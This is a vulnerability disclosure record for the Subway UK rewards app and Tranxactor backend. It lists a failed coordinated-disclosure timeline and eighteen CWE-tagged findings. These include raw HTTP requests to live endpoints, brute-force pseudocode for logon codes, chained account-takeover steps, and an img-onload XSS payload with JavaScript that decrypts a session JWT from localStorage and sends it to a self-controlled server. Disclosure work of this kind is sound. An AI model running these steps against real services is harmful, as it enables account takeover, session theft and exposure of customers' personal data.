
the vulnerabilities, weaknesses and theoretical attack scenarios were not targeted or started against any user. those were only tested for their existence, to include them in this record.

# Timeline

| Date | Action | Result |
|:-|:-|:-|
| 2024-04-24 | public disclosure | [this](https://github.com/steroblt/subeu2k22) |
| 2023-07-11 | CERT-BUND response | no reactions from reached contacts or through the international partners; <br> declared this QVD as failed |
| 2022-12-07 | contact CERT-BUND | provided additional contact informatio <br> guestcareemea@subway.com from Play Store, <br> privacy@subway.com from [Privacy Shield](https://www.privacyshield.gov/participant?id=a2zt0000000TNXNAA4) |
| 2022-11-22 | CERT-BUND response | all public subway contact trials received no response; <br> established contact via QSERC and tranxactor but no result; <br> also no reaction achieved through NCSC |
| 2022-11 | CERT-BUND action | refer information to UK's [NCSC](https://www.ncsc.gov.uk) |
| 2022-11 | CERT-BUND action | refer information to QSERC and tranxactor |
| 2022-10-27 | contact CERT-BUND | provided additional contact information for [Tranxactor](https://www.tranxactor.com) <br> and their certification body [QSERC](https://www.qserc.com.au)  |
| 2022-10-26 | CERT-BUND action | refer information to USA's [CISA-CERT](https://www.cisa.gov) |
| 2022-10-26 | CERT-BUND response | until now no reaction received to contact |
| 2022-10-18 | CERT-BUND action | tried to notify different public available contact information |
| 2022-10-18 | CERT-BUND response | provided information understood and verified plausible; <br> Coordinated Vulnerability Disclosure (CVD) process initialized |
| 2022-10-13 | CERT-BUND response | information receival acknowledged |
| 2022-10-11 | contact [BSI](https://bsi.bund.de)'s [CERT-BUND](https://www.bsi.bund.de/CERT-Bund) for assistance | ticket opened with additional info@subwayrewards.uk contact point |
| 2022-09-23 | tried to notify subcard@eipc.eu | 550 5.7.1 rejected, no longer in use, refers to info@subwayrewards.uk |
| 2022-08-10 | tried to notify security@rewards.subway.co.uk | 451 4.4.1 timed out |
| 2022-08-10 | tried to notify security@subway.co.uk | 550 5.5.10 not found |
| 2022-08 | vulnerabilities/weaknesses discovered | tried to get any contact to forward information to |

# Sub_is1

| Sub_is1 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-603: Use of Client-Side Authentication (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/603.html) </br> [CWE - CWE-471: Modification of Assumed-Immutable Data (MAID) (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/471.html) |
| Description | email update prohibited by UI, but not by API |
| Cause/Reference |  |
| URL/Location | https://rewards.subway.co.uk/tx-sub/members |
| Action | PATCH https://rewards.subway.co.uk/tx-sub/members HTTP/1.1 </br> Authorization: JWT= </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br> Content-Type: application/json </br>  </br> {"email":"changed-email@example.com"} |
| Result | From now on the primary email as well as the changed email exist. These two also get used for different purposes, but considered immutable. |

# Sub_is2

| Sub_is2 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-1250: Improper Preservation of Consistency Between Independent Representations of Shared State (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/1250.html) |
| Description | Refreshed token is reissued with primary unchanged email |
| Cause/Reference | [Sub_is1](#sub_is1) |
| URL/Location | https://rewards.subway.co.uk/tx-auth/auth/refresh |
| Action | POST https://rewards.subway.co.uk/tx-auth/auth/refresh HTTP/1.1 </br> Authorization: JWT= </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br> Content-Type: application/json </br>  </br> {"masterToken":"MT=="} |
| Result | {"token":"JWT="} contains userName that mismatches the changed email |

# Sub_is3

| Sub_is3 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-1250: Improper Preservation of Consistency Between Independent Representations of Shared State (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/1250.html) |
| Description | After email change logon code is sent to updated email |
| Cause/Reference | [Sub_is1](#sub_is1) |
| URL/Location | https://rewards.subway.co.uk/tx-auth/auth/logon |
| Action | POST https://rewards.subway.co.uk/tx-auth/auth/logon HTTP/1.1 </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br> Content-Type: application/json </br>  </br> {"username":"primary-email@example.com","password":"pwd"} |
| Result | Logon code is sent to changed/updated email, not primary |

# Sub_is4

| Sub_is4 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-288: Authentication Bypass Using an Alternate Path or Channel (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/288.html) </br> [CWE - CWE-372: Incomplete Internal State Distinction (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/372.html) |
| Description | Logon initialization possible without knowledge of password |
| Cause/Reference |  |
| URL/Location | https://rewards.subway.co.uk/tx-sub/registration/resendCode |
| Action | POST https://rewards.subway.co.uk/tx-sub/registration/resendCode HTTP/1.1 </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br> Content-Type: application/json </br>  </br> {"email":"primary-email@example.com"} |
| Result | Logon code for the account with the specified primary email is sent without the need for the password |

# Sub_is5

| Sub_is5 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-308: Use of Single-factor Authentication (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/308.html) |
| Description | Logon code verification is stateless and thus enumerable with brute-force |
| Cause/Reference |  |
| URL/Location | https://rewards.subway.co.uk/tx-sub/registration/verification/XXXXXX |
| Action | PUT [verificationUrls] HTTP/1.1 </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br>  </br> verificationUrls: </br> chars = [ </br> &ensp; 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M' </br> &ensp;, 'N', 'O','P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' </br> &ensp;, '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' </br> ] </br> foreach (c1 : chars) </br> foreach (c2 : chars) </br> foreach (c3 : chars) </br> foreach (c4 : chars) </br> foreach (c5 : chars) </br> foreach (c5 : chars) </br> foreach (c6 : chars) </br> &emsp; verificationId = "" + c1 + c2 + c3 + c4 + c5 + c6 </br> &emsp; verificationUrl ="https://rewards.subway.co.uk/tx-sub/registration/verification/"+ verificationId |
| Result | Normal session created for every valid verificationId that was not already used in time. Due to sometimes real long email transfer times of multiple 10 minutes the success rate is increased, too. There is also no obvious way to get directly to the code input page. So even if the target receives the code per email, it can't use it easily. The target – if it notices it – can only invalidate the code by starting another login. |

# Sub_is6

| Sub_is6 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-1250: Improper Preservation of Consistency Between Independent Representations of Shared State (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/1250.html) </br> [CWE - CWE-288: Authentication Bypass Using an Alternate Path or Channel (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/288.html) </br> [CWE - CWE-372: Incomplete Internal State Distinction (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/372.html) </br> [CWE - CWE-308: Use of Single-factor Authentication (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/308.html) |
| Description | Permanent targeted (known primary email) and untargeted account takeover |
| Cause/Reference | [Sub_is4](#sub_is4), [Sub_is5](#sub_is5), [Sub_is1](#sub_is1), [Sub_is3](#sub_is3) |
| URL/Location |  |
| Action | 1) Skip 1) if untargeted, else use [Sub_is4](#sub_is4) to issue a logon code for the target email </br> 2) Use [Sub_is5](#sub_is5) to brute-force verificationId until token is issued verify userName until target is matched, reissue 1) or reissue 2) when end is reached without match </br> 3) Use [Sub_is1](#sub_is1) to change email away from target to self-controlled email </br> 4) Due to [Sub_is3](#sub_is3) every subsequent logon with [Sub_is4](#sub_is4) is sent to the self-controlled email, removing the need for brute-force |
| Result | Permanent account takeover |

# Sub_is7

| Sub_is7 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-863: Incorrect Authorization (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/863.html) |
| Description | PromoCode is applicable after registration, UI only permits when registering |
| Cause/Reference |  |
| URL/Location | https://promocode.tranxactor.com/promoCode/ |
| Action | POST https://promocode.tranxactor.com/promoCode/ HTTP/1.1 </br> Authorization: JWT= </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) </br> Content-Type: application/json </br>  </br> {"code":"X-XXXXXX"} |
| Result | Promocode applied after the registration |

# Sub_is8

| Sub_is8 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-359: Exposure of Private Personal Information to an Unauthorized Actor (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/359.html) |
| Description | Referring user first and last name exposed, used code is retrievable at https://promocode.tranxactor.com/promoCode/ |
| Cause/Reference |  |
| URL/Location | https://promocode.tranxactor.com/promoCode/X-XXXXXX |
| Action | GET https://promocode.tranxactor.com/promoCode/X-XXXXXX HTTP/1.1 </br> Authorization: JWT= </br> moduleCode: SUB_STORMBORN </br> X-Requested-With: com.subway.subway </br> User-Agent: Mozilla/5.0 ([...]) |
| Result | {"sourceTraderName":"Xxx Yyy"} |

# Sub_is9

| Sub_is9 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/200.html) |
| Description | UserId/TraderId in response (-token), only |
| Cause/Reference | [Sub_is10](#sub_is10) |
| URL/Location | https://rewards.subway.co.uk/tx-sub/registration/activation/XXXXXX </br> https://rewards.subway.co.uk/tx-sub/registration/verification/XXXXXX </br> https://rewards.subway.co.uk/tx-auth/auth/refresh </br> https://promocode.tranxactor.com/promoCode/me </br> https://promocode.tranxactor.com/promoCode/X-XXXXXX </br> https://strapi-sub.tranxactor.com/mastercampaignresponses </br> https://strapi-sub.tranxactor.com/mastercampaignresponses/xxx |
| Action | PUT </br> PUT </br> POST </br> GET </br> GET </br> GET </br> GET |
| Result | {"traderId":xxxxxx} & {"traderId":"xxxxxx","userId":"xxxxxx"} in JWT </br> {"traderId":xxxxxx } & {"traderId":"xxxxxx","userId":"xxxxxx"} in JWT </br> {"userId":xxxxxx} & {"traderId":"xxxxxx","userId":"xxxxxx"} in JWT </br> [{"traders":[{"targetTraderId":xxxxxx}]}] </br> {"sourceTraderId":xxxxxx} </br> [{"userId":xxxxxx}] </br> {"userId":xxxxxx} |

# Sub_is10

| Sub_is10 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/200.html) </br> [CWE - CWE-359: Exposure of Private Personal Information to an Unauthorized Actor (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/359.html) |
| Description | Enumerable exposure of first and last name via PromoCode |
| Cause/Reference | [Sub_is8](#sub_is8), [Sub_is6](#sub_is6), [Sub_is9](#sub_is9), [Sub_is15](#sub_is15), [Sub_is18](#sub_is18) |
| URL/Location |  |
| Action | 1) (Optional) Fetch multiple targets UserId usinga. [Sub_is15](#sub_is15) from the campaignresponses. [Sub_is9](#sub_is9) (also recursively later on) </br> 2) PromoCode is deterministic/incremental, thus convertible to UserId </br> 3) Register a new account with above PromoCode (or use [Sub_is18](#sub_is18) with [Sub_is6](#sub_is6) to overtake any @anonym.com account, to reduce the number of new accounts to be created) </br> 4) Use [Sub_is8](#sub_is8) to retrieve SourceTraderName of PromoCode |
| Result | First and last name of other can be retrieved via UserId/PromoCode |

# Sub_is11

| Sub_is11 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-287: Improper Authentication (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/287.html) </br> [CWE - CWE-425: Direct Request ('Forced Browsing') (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/425.html) |
| Description | Unrestricted enumerable access of other's transactions with a Subcard, unlike listing of own transactions https://rewards.subway.co.uk/tx-sub/transactions |
| Cause/Reference |  |
| URL/Location | https://rewards.subway.co.uk/tx-sub/transactions/xxxxxx |
| Action | GET |
| Result | Transactions could be enumerated and massive (real-time) insights generated: </br> - Number of transactions, sales volume </br> - Number of 1-year-inactive users </br> - Squad bonus usage </br> - Points redemptions </br> - Campaigns/Promotions usage </br> - Number of referred registrations </br> - Number of first-time purchases </br> - ... over all properties </br>  </br> All these could additionally be refined by: </br> - location (country, region, state, city, franchise company, store) </br> - time (year, month, week, day, hour, minute) </br> - product (sub, footlong, drink, chips) </br> - ... eventually by all properties </br>  </br> With public knowledge from official company records/statements, one could additionally interpolate these insights to all sales. Some transactionIds are missing, these entries correspond to purchases without bonus card usage. |

# Sub_is12

| Sub_is12 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-204: Observable Response Discrepancy (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/204.html) |
| Description | Registered primary emails probeable/enumerable |
| Cause/Reference |  |
| URL/Location | https://rewards.subway.co.uk/tx-sub/validation </br> https://rewards.subway.co.uk/tx-sub/registration </br> https://rewards.subway.co.uk/tx-sub/registration/resendCode </br> https://rewards.subway.co.uk/tx-sub/password/forgotten |
| Action | POST </br> POST </br> POST </br> POST |
| Result | Different message/result for existing and non-existing primary emails |

# Sub_is13

| Sub_is13 |  |
| :---: | :-- |
| Weakness | [Admin panel customization - Strapi Developer Documentation](https://docs-v3.strapi.io/developer-docs/latest/development/admin-customization.html#customization-options) |
| Description | Quote of docs above "By default, the administration panel is exposed via http://localhost:1337/admin. However, for security reasons, you can easily update this path.", which should be respected. |
| Cause/Reference |  |
| URL/Location | https://strapi-sub.tranxactor.com/admin/ |
| Action | GET |
| Result |  |

# Sub_is14

| Sub_is14 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/497.html) </br> [CWE - CWE-1104: Use of Unmaintained Third Party Components (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/1104.html) |
| Description | Beta software used in production, [Release v3.0.0-beta.17 · strapi/strapi · GitHub](https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17) released at 2019-10-16, whereas v4.0.0 was released at 2021-11-30 and v4.20.4 already exists. This version is EOL and targetable with several public exploits. |
| Cause/Reference | [Sub_is13](#sub_is13) |
| URL/Location | https://strapi-sub.tranxactor.com/ </br> https://strapi-sub.tranxactor.com/admin/init </br> https://strapi-sub.tranxactor.com/admin/strapiVersion |
| Action | GET </br> GET </br> GET |
| Result | X-Powered-By: Strapi <strapi.io> </br> {"strapiVersion":"3.0.0-beta.17"} </br> {"strapiVersion":"3.0.0-beta.17"} |

# Sub_is15

| Sub_is15 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-862: Missing Authorization (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/862.html) |
| Description | All responses for campaigns (survey/poll) are accessible |
| Cause/Reference |  |
| URL/Location | https://strapi-sub.tranxactor.com/mastercampaignresponses [https://strapi-sub.tranxactor.com/mastercampaignresponses/xxx](https://strapi-sub.tranxactor.com/mastercampaignresponses/xxx) |
| Action | GET </br> GET |
| Result | All responses listed with answers and userId/traderId reference |

# Sub_is16

| Sub_is16 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-862: Missing Authorization (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/862.html) |
| Description | Write/modify access granted, contrary to other endpoints |
| Cause/Reference |  |
| URL/Location | https://strapi-sub.tranxactor.com/mastercampaigns </br> https://strapi-sub.tranxactor.com/mastercampaigns/xxx </br> https://strapi-sub.tranxactor.com/mastertandcs </br> https://strapi-sub.tranxactor.com/mastertandcs/xxx </br> https://strapi-sub.tranxactor.com/mastercampaignresponses/xxx |
| Action | POST </br> PUT </br> POST </br> PUT </br> PUT |
| Result | Resources can be created (POST) and edited (PUT). |

# Sub_is17

| Sub_is17 |  |
| :---: | :-- |
| Weakness |  |
| Description | Authenticated user session token extraction |
| Cause/Reference | [Sub_is16](#sub_is16) |
| URL/Location | https://subwayrewards.(at\|de\|fr\|ie\|nl\|uk\|se)/campaign?campaignCode=xxx |
| Action | 1) POST T&Cs due to [Sub_is16](#sub_is16) with: `{"json":{"isLink":false, "haveTickBox":false, "content":"<img onload=\"scriptEquivalentOfPoint7)\"/>You are now eligible to participate!","title":"Click here to get eligible for this survey."}}` </br> 2) POST Campaign due to [Sub_is16](#sub_is16), with the above T&Cs and: `{"campaignCode":"xxxxxx","json":{"acceptBtnText":"Submit only valid after clicking T&Cs", "isAcceptVisible":true, "isOverWriteTAndCTranslation":true", "custom_t_and_c_phrase_1":"Click here to be eligible to enter:", "custom_t_and_c_phrase_2":"Terms and Conditions"}, "mastertandc":{"responseOfPoint1)" }}` </br> 3) Share campaign link with chosen campaignCode from 2) </br> 4) Web UI automatically enforces user-login </br> 5) Authenticated user gets the instructions of 2) and click T&Cs link </br> 6) T&Cs dialog opens and `$.json.content` gets inserted with dangerouslySetInnerHTML(), which prevents the execution of <script>s but not \<img onload=[...]> </br> 7) `var j = localStorage.getItem("ls"); var w = new SimpleCrypt("subway").decrypt(j); var t = JSON.parse(JSON.parse(w)); var jwt = t.login.token;` </br> 8) Transmit the jwt via any means to self-controlled server (XHR, img, ...) </br> 9) Decode the jwt after receiving it, extract masterToken </br> 10) Refresh the jwt with the masterToken on the server |
| Result | Session token exfiltrated and decoupled from active user session |

# Sub_is18

| Sub_is18 |  |
| :---: | :-- |
| Weakness | [CWE - CWE-610: Externally Controlled Reference to a Resource in Another Sphere (4.8) (mitre.org)](https://cwe.mitre.org/data/definitions/610.html) |
| Description | Account deletion is only renaming the primary&secondary email and first/last name with anonymized data. This includes setting the email(s) to "anonymization.email.[userId]@anonym.com". |
| Cause/Reference | [Sub_is4](#sub_is4), [Sub_is5](#sub_is5), [Sub_is10](#sub_is10) |
| URL/Location | [#1419341 Hijack all emails sent to any domain that uses Cloudflare Email Forwarding (hackerone.com)](https://hackerone.com/reports/1419341) [Hijacking email with Cloudflare Email Routing // Albert Pedersen](https://albertpedersen.com/blog/hijacking-email-with-cloudflare-email-routing/) |
| Action | 1) Buy anonym.com (or due to being managed under cloudflare, which eventually had a – now closed – vulnerability in email forwarding) </br> 2) Set up forwarding of incoming emails to a controlled catch-all mailbox </br> 3) Request logon code with [Sub_is4](#sub_is4) for enumerated emails (++userId) </br> 4) Email arrives at catch-all mailbox, so no need for [Sub_is5](#sub_is5) enumeration </br> 5) Logon with the code received, this massively simplifies the enumeration of [Sub_is10](#sub_is10) |
| Result | The external controlled domain can get bought & controlled by anyone, whilst the reference stays the same. |
